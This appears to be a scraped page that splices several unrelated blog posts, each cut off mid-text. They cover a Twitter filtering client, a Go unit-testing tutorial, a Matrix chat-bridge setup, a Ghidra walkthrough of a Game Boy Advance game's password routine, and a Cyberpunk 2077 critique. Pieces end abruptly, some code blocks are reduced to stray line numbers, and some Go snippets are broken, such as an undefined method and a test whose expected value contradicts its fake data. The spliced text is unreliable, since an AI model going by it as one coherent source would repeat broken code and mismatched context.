<p><img src="https://thesephist.com/img/lucerne-usercard.jpg" alt="Lucerne looking at tweets by @devonzuegel"></p>
<p><strong>Following an aesthetic.</strong> I noticed recently that a lot of <a href="https://twitter.com/devonzuegel">@devonzuegel</a>’s tweets about urban design either contain interesting quotes from books or inspiring historical photographs. I follow her, but thought it would be nice to have a separate channel to just keep track of these. So I made a filter for <code>from:devonzuegel filter:images</code>, for “tweets containing images from @devonzuegel” which I’ve been enjoying checking once every one or two days. Through this channel, I also discovered a couple of other accounts that share photographs of urban design that I otherwise would have missed.</p>
<p><strong>“Following” high-noise accounts without following.</strong> There are a few accounts, like @naval, @david_perell, or @paulg that occasionally tweet really interesting ideas, but whom I don’t follow because there’s a lot of noise. With Lucerne, I could create channels like <code>from:david_perell -filter:replies min_faves:100</code> to “follow” the most popular tweets from these accounts without actually following them into my home timeline. I’ve found this so useful that I added a “top” button to profile cards that lets me one-click search a filter for “popular tweets from this person”, which is much more helpful than what Twitter’s web app gets you on a profile page, which are just the latest tweets they happened to have sent.</p>
<p>Over time, I think my curated list of channels is going to become an interesting index into my own interests, perspective, and information consumption habits, which I find a really cool idea. I’m excited about how Lucerne can help me use Twitter to learn and share better going forward, and I"m also curious about how I could apply this idea of “tools that grow as you use it” to other parts of my life, like the web browser or my email experience.</p>
<p>And because I know you’re asking: while I don’t think I’m going to make this current version of Lucerne open for public …</p></article></div>

<h2 id="1testingingo">1. Testing in Go</h2>
<p>Go has a built-in testing command called <code>go test</code> and a package <code>testing</code> which combine to give a minimal but complete testing experience.</p>

<h3 id="12writingtests">1.2 Writing tests</h3>
<p>Unit testing in Go is just as opinionated as any other aspect of the language like formatting or naming. The syntax deliberately avoids the use of assertions and leaves the responsibility for checking values and behaviour to the developer.</p>
<p>Here is an example of a method we want to test in the <code>main</code> package. We have defined an exported function called <code>Sum</code> which takes in two integers and adds them together.</p>
<pre><code>package main

func Sum(x int, y int) int {
    return x + y
}

func main() {
    Sum(5, 5)
}
</code></pre>
<p>We then write our test in a separate file. The test file can be in a different package (and folder) or the same one (<code>main</code>). Here's a unit test to check addition:</p>
<pre><code>package main

import "testing"

func TestSum(t *testing.T) {
    total := Sum(5, 5)
    if total != 10 {
       t.Errorf("Sum was incorrect, got: %d, want: %d.", total, 10)
    }
}
</code></pre>
<p>Characteristics of a Golang test function:</p>
<ul>
<li>The first and only parameter needs to be <code>t *testing.T</code></li>
<li>It begins with the word Test followed by a word or phrase starting with a capital letter.</li>
<li>(usually the method under test i.e. <code>TestValidateClient</code>)</li>
<li>Calls <code>t.Error</code> or <code>t.Fail</code> to indicate a failure (I called t.Errorf to provide more details)</li>
<li><code>t.Log</code> can be used to provide non-failing debug information</li>
<li>Must be saved in a file named <code>something_test.go</code> such as: <code>addition_test.go</code></li>
</ul>
<blockquote>
<p>If you have code and tests in the same folder then you cannot execute your program with <code>go run *.go</code>. I tend to use <code>go build</code> to create a binary and then I run that.</p>
</blockquote>
<p>You may be more used to using the <code>Assert</code> keyword to perform checking, but the authors of <a href="https://www.amazon.co.uk/Programming-Language-Addison-Wesley-Professional-Computing/dp/0134190440">The Go Programming Language</a> make some good arguments for Go's style over Assertions.</p>
<p>When using assertions:</p>
<ul>
<li>tests can feel like they're written in a different language (RSpec/Mocha for instance)</li>
<li>errors can be cryptic "assert: 0 == 1"</li>
<li>pages of stack traces can be generated</li>
<li>tests stop executing after the first assert fails - masking patterns of failure</li>
</ul>
<blockquote>
<p>There are third-party libraries that replicate the feel of RSpec or Assert. See also <a href="https://github.com/stretchr/testify">stretchr/testify</a>.</p>
</blockquote>
<p><strong>Test tables</strong></p>
<p>The concept of "test tables" is a set (slice array) of test input and output values. Here is an example for the <code>Sum</code> function:</p>
<pre><code>package main

import "testing"

func TestSum(t *testing.T) {
	tables := []struct {
		x int
		y int
		n int
	}{
		{1, 1, 2},
		{1, 2, 3},
		{2, 2, 4},
		{5, 2, 7},
	}

	for _, table := range tables {
		total := Sum(table.x, table.y)
		if total != table.n {
			t.Errorf("Sum of (%d+%d) was incorrect, got: %d, want: %d.", table.x, table.y, total, table.n)
		}
	}
}
</code></pre>
<p>If you want to trigger the errors to break the test then alter the <code>Sum</code> function to return <code>x * y</code>.</p>
<pre><code>$ go test -v
=== RUN   TestSum
--- FAIL: TestSum (0.00s)
	table_test.go:19: Sum of (1+1) was incorrect, got: 1, want: 2.
	table_test.go:19: Sum of (1+2) was incorrect, got: 2, want: 3.
	table_test.go:19: Sum of (5+2) was incorrect, got: 10, want: 7.
FAIL
exit status 1
FAIL	github.com/alexellis/t6	0.013s
</code></pre>
<p><strong>Launching tests:</strong></p>
<p>There are two ways to launch tests for a package. These methods work for unit tests and integration tests alike.</p>
<ol>
<li>Within the same directory as the test:</li>
</ol>
<pre><code>go test
</code></pre>
<p><em>This picks up any files matching packagename_test.go</em></p>
<p>or</p>
<ol start="2">
<li>By fully-qualified package name</li>
</ol>
<pre><code>go test github.com/alexellis/golangbasics1
</code></pre>
<p>You have now run a unit test in Go, for a more verbose output type in <code>go test -v</code> and you will see the PASS/FAIL result of each test including any extra logging produced by <code>t.Log</code>.</p>
<blockquote>
<p>The difference between unit and integration tests is that unit tests usually isolate dependencies that communicate with network, disk etc. Unit tests normally test only one thing such as a function.</p>
</blockquote>
<h2 id="13moreongotest">1.3 More on <code>go test</code></h2>
<p><strong>Statement coverage</strong></p>
<p>The <code>go test</code> tool has built-in code-coverage for statements. To try it with out example above type in:</p>
<pre><code>$ go test -cover
PASS
coverage: 50.0% of statements
ok  	github.com/alexellis/golangbasics1	0.009s
</code></pre>
<p>High statement coverage is better than lower or no coverage, but metrics can be misleading. We want to make sure that we're not only executing statements, but that we're verifying behaviour and output values and raising errors for discrepancies. If you delete the "if" statement from our previous test it will retain 50% test coverage but lose its usefulness in verifying the behaviour of the "Sum" method.</p>
<p><strong>Generating an HTML coverage report</strong></p>
<p>If you use the following two commands you can visualise which parts of your program have been covered by the tests and which statements are lacking:</p>
<pre><code>go test -cover -coverprofile=c.out
go tool cover -html=c.out -o coverage.html 
</code></pre>
<p>Then open coverage.html in a web-browser.</p>
<p><strong>Go doesn't ship your tests</strong></p>
<p>In addition, it may feel un-natural to leave files named <code>addition_test.go</code> in the middle of your package. Rest assured that the Go compiler and linker will not ship your test files in any binaries it produces.</p>
<p>Here is an example of finding the production vs test code in the net/http package we used in the previous Golang basics tutorial.</p>
<pre><code>$ go list -f={{.GoFiles}} net/http
[client.go cookie.go doc.go filetransport.go fs.go h2_bundle.go header.go http.go jar.go method.go request.go response.go server.go sniff.go status.go transfer.go transport.go]

$ go list -f={{.TestGoFiles}} net/http
[cookie_test.go export_test.go filetransport_test.go header_test.go http_test.go proxy_test.go range_test.go readrequest_test.go requestwrite_test.go response_test.go responsewrite_test.go transfer_test.go transport_internal_test.go]
</code></pre>
<p>For more on the basics read the <a href="https://golang.org/pkg/testing/">Golang testing docs</a>.</p>
<h3 id="14isolatingdependencies">1.4 Isolating dependencies</h3>
<p>The key factor that defines a unit test is isolation from runtime-dependencies or collaborators.</p>
<p>This is achieved in Golang through interfaces, but if you're coming from a C# or Java background, they look a little different in Go. Interfaces are implied rather than enforced which means that concrete classes don't need to know about the interface ahead of time.</p>
<p>That means we can have very small interfaces such as <a href="https://golang.org/src/io/io.go?s=4977:5022#L116">io.ReadCloser</a> which has only two methods made up of the Reader and Closer interfaces:</p>
<pre><code>        Read(p []byte) (n int, err error)
</code></pre>
<p><em>Reader interface</em></p>
<pre><code>        Close() error
</code></pre>
<p><em>Closer interface</em></p>
<p>If you are designing a package to be consumed by a third-party then it makes sense to design interfaces so that others can write unit tests to isolate your package when needed.</p>
<p>An interface can be substituted in a function call. So if we wanted to test this method, we'd just have to supply a fake / test-double class that implemented the Reader interface.</p>
<pre><code>package main

import (
	"fmt"
	"io"
)

type FakeReader struct {
}

func (FakeReader) Read(p []byte) (n int, err error) {
	// return an integer and error or nil
}

func ReadAllTheBytes(reader io.Reader) []byte {
	// read from the reader..
}

func main() {
	fakeReader := FakeReader{}
	// You could create a method called SetFakeBytes which initialises canned data.
	fakeReader.SetFakeBytes([]byte("when called, return this data"))
	bytes := ReadAllTheBytes(fakeReader)
	fmt.Printf("%d bytes read.\n", len(bytes))
}
</code></pre>
<p>Before implementing your own abstractions (as above) it is a good idea to search the Golang docs to see if there is already something you can use. In the case above we could also use the standard library in the <a href="https://golang.org/pkg/bytes/">bytes</a> package:</p>
<pre><code>    func NewReader(b []byte) *Reader
</code></pre>
<p>The Golang <a href="https://golang.org/pkg/testing/iotest/">testing/iotest</a> package provides some Reader implementations which are slow or which cause errors to be thrown half way through reading. These are ideal for resilience testing.</p>
<ul>
<li>Golang docs: <a href="https://golang.org/pkg/testing/iotest/">testing/iotest</a></li>
</ul>
<h3 id="15workedexample">1.5 Worked example</h3>
<p>I'm going to refactor the code example from the <a href="http://blog.alexellis.io/golang-json-api-client/">previous article</a> where we found out how many astronauts were in space.</p>
<p>We'll start with the test file:</p>
<pre><code>package main

import "testing"

type testWebRequest struct {
}

func (testWebRequest) FetchBytes(url string) []byte {
	return []byte(`{"number": 2}`)
}

func TestGetAstronauts(t *testing.T) {
	amount := GetAstronauts(testWebRequest{})
	if amount != 1 {
		t.Errorf("People in space, got: %d, want: %d.", amount, 1)
	}
}
</code></pre>
<p>I have an exported method called GetAstronauts which calls into a HTTP endpoint, reads the bytes from the result and then parses this into a struct and returns the integer in the "number" property.</p>
<p>My fake / test-double in the test only returns the bare minimum of JSON needed to satisfy the test, and to begin with I had it return a different number so that I knew the test worked. It's hard to be sure whether a test that passes first time has worked.</p>
<p>Here's the application code where we run our <code>main</code> function. The <code>GetAstronauts</code> function takes an interface as its first argument allowing us to isolate and abstract away any HTTP logic from this file and its import list.</p>
<pre><code>package main

import (
	"encoding/json"
	"fmt"
	"log"
)

func GetAstronauts(getWebRequest GetWebRequest) int {
	url := "http://api.open-notify.org/astros.json"
	bodyBytes := getWebRequest.FetchBytes(url)
	peopleResult := people{}
	jsonErr := json.Unmarshal(bodyBytes, &amp;peopleResult)</code></pre></div></section></article></div></div>

<p>Here at the end of the world, it's time to take stock. Is technology a force for good? Can it be? Was it ever?

</figure>

<p>Once upon a time, there were many chat services. AOL Instant Messenger, Yahoo Messenger, ICQ and others. These messengers had their own desktop clients, and developers reverse engineered their protocol to build custom applications, both open and closed source. Trillian, Audium and Pidgin were applications that let people communicate across all these messengers with one program. Over time the old protocols died, and newer chat services like Facebook Messenger and Google Hangouts started storing your entire history on their servers. People started using the web interfaces and mobile apps, no longer caring about desktop programs.</p>

<p>Matrix is an open source communication protocol. It’s similar to XMPP (formerly Jabber) in the sense that anyone can set up a Matrix server and communicate to people on other Matrix servers. It’s a federated protocol, just like e-mail. Google Hangouts used to support XMPP federation, but silently removed support in 2014. Matrix supports bridging other chat services, so they can appear in a unified view. With my current setup of Matrix and appropriate bridges, I’ve combined my view of Facebook Messenger, Google Hangouts, Telegram and native Matrix chats into one convenient user interface. The path to get to that integration was not as simple.</p>

<!--more-->

<p>The dedicated server I use for <a href="https://battlepenguin.com/tech/a-history-of-personal-and-professional-websites/">this website</a> and other self-hosted web applications, is located in Germany. Logging in to Facebook or Google’s chat system from a country I’m not currently in, can raise all sorts of security flags and lock me out of my account. For those bridges, I purchased a small virtual machine in a Chicago data center. I installed a proxy on that server, accessible only via VPN, to view both Google and Facebook, so they record the IP address I’m connecting from with my web browser. This helps minimize security lockouts. Telegram isn’t hostile to third party developers, and has an official API. It doesn’t care my bridge is connecting to it from Germany, so I host it on the dedicated server.</p>

<figure>
  
  <img src="https://battlepenguin.com/images/tech/matrix/server-diagram.png" alt="Server Diagram of Matrix Homeserver and Bridges">
  
  
  <figcaption>
      

      Server Diagram of Matrix Homeserver and Bridges

      
  </figcaption>
  
</figure>

<p>The reference Matrix server is called Synapse. It, as well as the <a href="https://github.com/tulir/mautrix-telegram">mautrix-telegram</a>, <a href="https://github.com/tulir/mautrix-hangouts">mautrix-hangouts</a> and <a href="https://github.com/tulir/mautrix-facebook">mautrix-facebook</a> bridges all have official Docker containers built by their developers. Each bridge must be able to communicate with the Synapse homeserver. Their instructions go through generating configuration and key pairs that are copied over to Synapse in order to form their authentication bridge. The bridges provide chat robots that guide you through getting OAuth tokens or cookies for those respective services.</p>

<figure>
  
  <img src="https://battlepenguin.com/images/tech/matrix/element-screenshot.png" alt="Facebook and Hangouts Chats in Element">
  
  
  <figcaption>
      

      Facebook and Hangouts Chats in Element

      
  </figcaption>
  
</figure>

<p>The wiki for each bridge also has instructions for enabling double-puppeting, making each chat look seamless between myself and the accounts on the other side of each respective bridge. Without double-puppeting, each conversation will be in a three person group with the Matrix user, the bridge user (e.g my Google Hangouts user) and the person I’m talking to.</p>

<figure>
  
  <img src="https://battlepenguin.com/images/tech/matrix/no-double-puppet.png" alt="Chat Without Double-Puppeting Enabled">
  
  
  <figcaption>
      

      Chat Without Double-Puppeting Enabled

      
  </figcaption>
  
</figure>

<p>Enabling double-puppeting via the <code>curl</code> command in the bridge documentation and calling <code>login-matrix</code> on the bot, removes the creation of three person rooms. The bridged accounts will now show up as regular, two-person conversations.</p>

<p>I use the Element desktop app to connect to my matrix server, but I also have a web version of Element running from its own official Docker container in case I need to access chat from another computer. There are other clients, such as <a href="https://github.com/mirukana/mirage">Mirage</a> which is built using Qt and <a href="https://fluffychat.im/">Fluffychat</a> for mobile. Although I use Synapse for my homeserver, there are other servers that support the Matrix protocol that are in use and under active development.</p>

<p>Setting up all the Matrix components wasn’t too difficult, but it does require knowledge or experience with running services. It took a considerable amount of work and debugging to get each bridge operational, compounded slightly by my complex networking setup. Most people would probably just run all of this on a Raspberry Pi at home. I feel that using Matrix with bridges is still somewhat inaccessible to people who aren’t interested in development or server administration. Still, the satisfaction of having unified chat, plus one more layer of abstraction between myself and Google or Facebook, feels like it was wroth the overall effort.</p>

December 27, 2020 | https://wrongbaud.github.io/posts/ghidra-debugger/ | <a href="https://web.archive.org/web/*/https://wrongbaud.github.io/posts/ghidra-debugger/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src=""></p><h2 id="overview">Overview</h2><p><a href="https://twitter.com/NSACyber/status/1339652646513291264">Yesterday</a> the NSA Twitter account announced that a new branch of Ghidra has been release with the long-awaited debugging capability. This will allow for single-step debugging of a program within <a href="https://hackaday.io/course/172292-introduction-to-reverse-engineering-with-ghidra">Ghidra</a> through a GDB stub or other various debug mechanisms. To celebrate this (and my being stuck at home quarantining…) I wanted to review how to build this version of Ghidra and give an example of how to use this debugger on a fun target.</p><p>This post will explain the following:</p><ul><li>How to build the latest (or any) version of Ghidra using a <a href="https://github.com/dukebarman/ghidra-builder">Docker Container</a></li><li>How to build the Ghidra Eclipse plugins</li><li>How to build a program <a href="https://github.com/SiD3W4y/GhidraGBA">loader</a> for Ghidra</li><li>Debugging a program with Ghidra using the GDB stub</li><li>Use the debugging capability to help us learn about how passwords are processed for a GBA game</li></ul><p>For this post, we’re going to be taking a look at the Game Boy Advance game Spiderman: Mysterio’s Menace. I’ve been very much inspired by all of the awesome work that <a href="https://youtu.be/VVbRe7wr3G4">stacksmashing and Liveoverflow have been doing regarding these topics</a>. This was a game that I spent a lot of time playing and it’s always fun revisiting childhood favorites from an RE perspective. The ultimate goal is to demonstrate how to properly load this ROM using a custom loader, and connect to an emulator’s GDB stub using Ghidra’s debugging features.</p><p><strong>RE Note/Tangent:</strong> When taking on a new reversing project, it’s important to try to compartmentalize goals and targets. For example, if we said we just want to <em>reverse</em> this game, that opens up endless possibilities. We could reverse engineer the collision detection, how enemy AI works, or how level maps are generated. For this post, we will pick a specific target and take a look at the password mechanism in use by this game.</p><p>I am doing all of this work on an Ubuntu 20.04 machine, with the latest updates.</p><h2 id="building-ghidra">Building Ghidra</h2><p>First things first, this debugger branch has not yet been included in an official release so we’re going to have to build it ourselves. Luckily for us <a href="https://github.com/dukebarman/ghidra-builder">dukebarman</a> has put together a docker container for us to do this, all we need to do is modify the <code>build_ghidra.sh</code> script to checkout the debugger branch, see the following line below:</p><div><p><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>git clone https://github.com/NationalSecurityAgency/ghidra -b debugger
</pre></td></tr></tbody></table></code></p></div><p>We are also going to build the Eclipse development extensions for this version of Ghidra, this will help us later on when we build a loader and write our analysis scripts. To do this we add the following line to the <code>build_ghidra.sh</code> script:</p><div><p><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>gradle prepDev
gradle eclipse -PeclipsePDE
</pre></td></tr></tbody></table></code></p></div><p>Next follow the instructions in the <code>README</code>:</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>cd ghidra-builder
sudo docker-tpl/build
cd workdir
sudo ../docker-tpl/run ./build_ghidra.sh
</pre></td></tr></tbody></table></code></p></div><p>This will take some time, so maybe go grab a coffee or two and come back to your freshly built Ghidra. The resulting build can be found in <code>workdir/out</code>:</p><div><p><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>wrongbaud@wubuntu:~/blog/gba-re-gbd/ghidra-builder/workdir$ ls out/
ghidra_9.3_DEV_20201218_linux64.zip
</pre></td></tr></tbody></table></code></p></div><p>Unzip this file, and you can launch Ghidra via the <code>./ghidraRun</code> script. For this post, I will unzip this into the <code>ghidra-builder/workdir</code> directory because we’re going to be using the docker container to build a Ghidra loader for this version of Ghidra.

The eclipse projects can be found in the <code>ghidra-builder/workdir/ghidra/GhidraBuild/EclipsePlugins/GhidraDev</code> directory.</p><ol><li>Install <a href="https://www.eclipse.org/downloads/packages/installer">Eclipse</a><ul><li>Select the Java IDE</li></ul></li><li>Install CDT, PyDev, and Plugin Development Environment<ul><li>This can be done from the Eclipse marketplace</li></ul></li><li>Import the GhidraDevFeature and GhidraDevPlugin projects<ul><li>These can be found in the <code>ghidra-builder/workdir/ghidra/GhidraBuild/EclipsePlugins/GhidraDev/</code> directory</li><li><code>File</code> -&gt; <code>Import</code> -&gt; <code>General</code> -&gt; <code>Existing Projects into Workspace</code></li><li>Add <code>ghidra-builder/workdir/ghidra/GhidraBuild/EclipsePlugins/GhidraDev</code></li><li>Select “Search for nested projects”</li><li>Import the projects!</li><li><strong>Note:</strong> you may see some build errors when these are imported, you can ignore these as you are just exporting the plugin!</li></ul></li><li>With these projects loaded, we can now <a href="https://github.com/NationalSecurityAgency/ghidra/blob/debugger/GhidraBuild/EclipsePlugins/GhidraDev/GhidraDevPlugin/build_README.txt">export the plugin</a><ul><li><code>File</code> -&gt; <code>Export</code></li><li><code>Plug-in Development</code> -&gt; <code>Deployable Features</code></li><li><code>ghidradev.ghidradev</code></li><li>Select an archive location for the plugin to be exported to</li><li>Click Finish!</li></ul></li></ol><p>Now we have our Ghidra plugin, built for our custom version of Ghidra that we can load via <code>Help</code>-&gt;<code>Install New Software</code>.</p><p>And with that, we have built Ghidra from the <code>debugger</code> branch, and have also built the Eclipse development extensions so we can build plugins for our new version of Ghidra!</p><p><strong>Note:</strong> I just want to take a second to outline just how incredible the <a href="https://github.com/NationalSecurityAgency/ghidra/blob/15c1f43fa51f210836cb451aff587b227dffe0a7/DevGuide.md">help docs</a> are for Ghidra. From the P-Code manuals to the instructions on building and exporting these plugins - the project is very well documented.</p><h2 id="building-the-rom-loader">Building the ROM Loader</h2><p>To properly analyze this ROM in Ghidra, we are going to need to define all of the <a href="https://problemkaputt.de/gbatek.htm#gbamemorymap">memory regions and peripherals</a> for the Game Boy Advance. Luckily for us, <a href="https://github.com/SiD3W4y/GhidraGBA">SiD3W4y</a> on GitHub has already written one.</p><p>If you are a regular reader of this blog, a <a href="https://wrongbaud.github.io/posts/writing-a-ghidra-loader/">ghidra loader</a> may be a familiar subject to you. If not, the purpose of a Ghidra loader is to set up all of the necessary memory regions, identify any debug information or symbols that may be present in the file, and provide as much information as possible about the target file. The loader that was mentioned before outlines all of the basic peripherals of the GBA and is an excellent example loader to work with, let’s start by cloning it into the <code>ghidra-builder/workdir</code> directory. We’re doing this because we’re going to use the same docker container we built Ghidra with to build this loader.</p><div><p><code><table><tbody><tr><td><pre>1

exit
</pre></td></tr></tbody></table></code></p></div><p>In case the above steps are confusing, what we are doing is:</p><ol><li>Launching the docker container</li><li>Building the GhidraGBA extension, providing the path to our installation</li><li>Copying it to Ghidra’s extensions directory (so it will show up under the Install Extensions menu)</li><li>Exiting the docker container</li></ol><p>Launch Ghidra via <code>ghidraRun</code> and go to <code>File</code>-&gt; <code>Install Extensions</code>. Select the GhidraGBA loader and click <code>OK</code>. You will need to restart Ghidra for the change to take effect. Now when you load a GBA ROM you should see the following:</p><p><img data-src="https://wrongbaud.github.io/assets/img/ghidra-dbg/gba.png" alt="GBA" src="https://wrongbaud.github.io/assets/img/ghidra-dbg/gba.png"></p><p>After running the auto analysis, Ghidra seems to make a pretty quick sense of the ROM. There are a lot of functions defined and things are looking good. So the next step is to figure out some way to narrow down what we care about in this ROM image, in other words, we need to find our needle in the haystack. Let’s start by examining how the password system works in this game by entering a few passwords.</p><h2 id="analyzing-the-rom">Analyzing the Rom</h2><p>As mentioned before, our goal here is to try to understand the password system in use by this game. If we attempt to enter a password, the following screen is displayed:</p><p><img data-src="https://wrongbaud.github.io/assets/img/ghidra-dbg/rom-1.png" alt="ROM1" src="https://wrongbaud.github.io/assets/img/ghidra-dbg/rom-1.png"></p><p>Note that we have all of the consonants and no vowels and numbers “0-9”, and our passwords are only 5 characters long. This is a nice starting point for us as reverse engineers. We can use this information to help us narrow down functions of interest. For example- let’s look through the strings in the ROM and see if these values are represented in a string somewhere. If we open the strings window, <code>Window</code> -&gt; <code>Defined Strings</code>, and filter for the first 5 characters available to us as password characters we see the following:</p><p><img data-src="https://wrongbaud.github.io/assets/img/ghidra-dbg/strings-password-characters.png" alt="" src="https://wrongbaud.github.io/assets/img/ghidra-dbg/strings-password-characters.png"></p><p>So far so good - we only have two instances of this string in use. One is located at <code>0x804c11fc</code> and one at <code>0x84b86f0</code>. Upon examination of the first one, we see that this string gets passed to a function in the subroutine located at <code>0x8003358</code>, see below:</p><div><p><code><table><tbody><tr><td><pre>1

                    <p>Though this is a blog for media critiques, side stories for <a href="https://constelisvoss.ml/">CONSTELIS VOSS</a>, news, art posts, etc, I feel like the only place this article can live is <em>here</em>.</p><p>Not on <a href="https://weebtrash.ga/">weebtrash</a>. Not on <a href="https://medium.com/@kiraIeigh">Medium</a>. Not on <a href="https://www.linkedin.com/in/kirakiraleighleigh">LinkedIn</a>. Here, in a space centered on a sci-fi trilogy about robots, corruption, tropes, and what it means to be a person.</p><p>Cyberpunk 2077 was initially framed as an ambitious stab at a genre often overlooked in popular media; this was a promise.</p><p>Sadly, Cyberpunk 2077 misses the mark, despite being an overall very enjoyable game. CD Projekt Red's treatment of the genre is worse than the buggy launch, and I'm going to explain how and why.</p><p>First, let's explore two IPs that do it right. Then, we'll compare Cyberpunk 2077 against their core messaging.</p><p>Let's begin.</p><h2 id="how-ghost-in-the-shell-tackles-cyberpunk">How Ghost in the Shell Tackles Cyberpunk</h2><h3 id="all-barriers-are-moot">All barriers are moot</h3><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/MOSHED-2020-12-4-13-22-6-2.gif" alt=""></figure><p>Wikipedia's explanation of the Cyberpunk genre:</p><blockquote><strong>Cyberpunk</strong> is a <a href="https://en.wikipedia.org/wiki/Subgenre">subgenre</a> of <a href="https://en.wikipedia.org/wiki/Science_fiction">science fiction</a> in a <a href="https://en.wikipedia.org/wiki/Dystopia">dystopian</a> <a href="https://en.wikipedia.org/wiki/Futurism">futuristic</a> setting that tends to focus on a "combination of <a href="https://en.wikipedia.org/wiki/Low-life">low-life</a> and <a href="https://en.wikipedia.org/wiki/High_tech">high tech</a>"<sup><a href="https://en.wikipedia.org/wiki/Cyberpunk#cite_note-1">[1]</a></sup> featuring advanced technological and scientific achievements, such as <a href="https://en.wikipedia.org/wiki/Artificial_intelligence">artificial intelligence</a> and <a href="https://en.wikipedia.org/wiki/Cybernetics">cybernetics</a>, juxtaposed with a degree of breakdown or radical change in the <a href="https://en.wikipedia.org/wiki/Social_order">social order</a>.</blockquote><p>But it's so much more than that. Look no further than <a href="https://en.wikipedia.org/wiki/Ghost_in_the_Shell">Ghost in the Shell</a> for a deeper examination.</p><p>Ghost in the Shell is about a lot of things, but what makes it a great overview of the genre itself is that Motoko Kusanagi—the protagonist—isn't limited by her physical body.</p><p>The body is a tool. The soul (Ghost) is what matters, and even that can be reconfigured, if one chooses.</p><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/OK6W_koKDTOqqqLDbIoPAvKwT3u7zGxQ6vZ1ij2uHr8.gif" alt=""></figure><p>Motoko moves through cyberspace, breaks her body to fight her opponents, and exists as a tour de force in a landscape of corruption.</p><p>As the IP has multiple iterations, different topics take the forefront in different mediums. However, Motoko is always the through-line; a cybernetic warrior who uses a canonically pleasure-district shell, augmented to beat the crap out of her opponents, regardless of the physical costs.</p><p>Furthermore, in the 90s movie, she meets a sentient AI who she merges with to yet again break human barriers (and touch on sentiency).</p><p>Barriers are no object, and choices are fathomless, despite being in a world of corruption. Cyberpunk technology affords this.</p><p>That is the backbone of the Cyberpunk genre, as explained by Ghost in the Shell. </p><h2 id="how-blade-runner-tackles-cyberpunk">How Blade Runner tackles Cyberpunk</h2><h3 id="what-is-sentiency-what-is-agency">What is sentiency? What is agency?</h3><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/f11157d2551ba0894c07a55b5f0dd9aa.gif" alt=""></figure><p>The original <a href="https://en.wikipedia.org/wiki/Blade_Runner">Blade Runner</a> film centers around synthetic beings (replicants) going rogue. Harrison Ford's Deckard is on a mission to reel-in misbehaving androids; that's the low media literacy baby-shit-brain reading.</p><p>You could also read Deckard as possibly being a synth himself. Or, you could read Deckard's attraction to Rachael—a replicant—as a question about love. Can androids truly love?</p><p>You could also read it as a commentary on sentiency via Pris and Roy's (both replicants) existential crises.</p><p>In the new film, <a href="https://en.wikipedia.org/wiki/Blade_Runner_2049">Blade Runner 2049</a>, you could read Gosling's K—another replicant—as experiencing true personhood through the juxtaposition of who he isn't.</p><p>By questioning his place in the narrative when he realizes his memories are fake, he explodes with emotion, and dies with the knowledge that he's challenged what he even is. That's sentiency, baby.</p><p>There are many concepts in the Blade Runner movies, and the <a href="https://en.wikipedia.org/wiki/Do_Androids_Dream_of_Electric_Sheep%3F">novel </a>they're based on, but all of them grapple with these topics:</p><p>Who gets to be a person, who gets to be free, who gets to feel, who gets to live, and who doesn't.</p><p>The backbone of the Blade Runner IP exists to question these aspects of sentiency and agency.</p><p>So what does Cyberpunk 2077 do with GiTS' and Blade Runner's hot-takes?</p><h2 id="cyberpunk-2077-fumbles-barriers-are-moot">Cyberpunk 2077 fumbles "barriers are moot"</h2><h3 id="the-body-is-not-sacred-game-director-adam-badowski">The body is not sacred, game director Adam Badowski</h3><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/MOSHED-2020-12-4-14-50-53-2.gif" alt=""></figure><blockquote>"This is cyberpunk, so people augment their body. So the body is no longer sacrum [sacred]; it's profanum [profane]. Because people modify everything, they are losing their connection to the body, to the meat. And that's why we need to use the nudity in many situations."</blockquote><p>The Cyberpunk genre is about the philosophy of personhood and human existence as juxtaposed to and twisted against technology, set upon a backdrop of corporate dystopia.</p><p>Not only are Badowski's statements ignorant of the genre, but the way Cyberpunk 2077 handles these topics is, too.</p><p>You cannot augment your character within an inch of their life. You cannot even cut their hair after the initial character generation screen. </p><p>You cannot become a 9 foot chrome-lacquered war-machine with a car engine for a crotch. You can't swap your consciousness into something else.</p><p>Because we know other characters <em><strong>can,</strong></em> Cyberpunk 2077 offers the illusion of choice by showing it exists, but barely gives it to the player.</p><p>Speaking of barely; though you can swap voice/junk gender, this doesn't break down gender barriers meaningfully.</p><p>You cannot blur the lines of sexuality, because your romance options are very limited. Have a male voice but a female body? Many routes are off the table. However, the problem isn't so much that characters [to reflect IRL people] have certain 'equipment' preferences. That's valid.</p><p>The problem is that players <em><strong>should</strong></em> be able to have a car engine for a crotch and see how that shakes things up, for example. If it does at all. </p><p>This is the one genre that <em>most</em> benefits from a predominantly bisexual romance roster, or at the very least, it benefits from having the balls to tackle the transhumanism topic.</p><p>When corporations plaster ads inside of your eyeballs, the only thing left is the ability to transform yourself beyond limits. One of those limits is the self. </p><p>The other is grappling with what the self means when you replace it with cyberware, and what flavor of human <em>other </em>people see you as.</p><p>Cyberpunk 2077 does make a stance on this, and it's not as expected; too much self-reconfiguration makes you a Cyberpsycho. NPCs lose their mind if they replace too many parts.</p><p>This shows us that the "flesh as sacrum" aspect is unavoidable. </p><p>Because of all this, Cyberpunk 2077 smacks into the "barriers are moot" genre-point like V's car barrels down roads with the finesse of a bull in a china shop.</p><p>It's nothing but barriers, with the veneer of choice.</p><h2 id="cyberpunk-2077-mishandles-the-sentiency-agency-question">Cyberpunk 2077 mishandles "the sentiency/agency question"</h2><h3 id="despite-the-attention-paid-to-johnny-invading-your-shell">Despite the attention paid to Johnny invading your shell</h3><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/cyberpunk2077-1.jpg" alt=""></figure><p>Does Cyberpunk 2077 address "the sentiency/agency question"? Keanu's Johnny Silverhands invades your shell, which suggests it does, but there's a problem.</p><p>In order to analyze this, we have to talk about the results. There are 5 endings, and all of them are a flavor of "you die because your body is beyond saving", "Johnny takes over" or "go to cyberjail while Arasaka figures out how to ya yeet you." </p><p>Only two routes shake things up, and one is "commit suicide" while the other is "fuck off somewhere to solve the problem, off-screen."</p><p>The issue? There are in-game lore "outs" to suggest personhood doesn't stop at meat suits. Lizzy 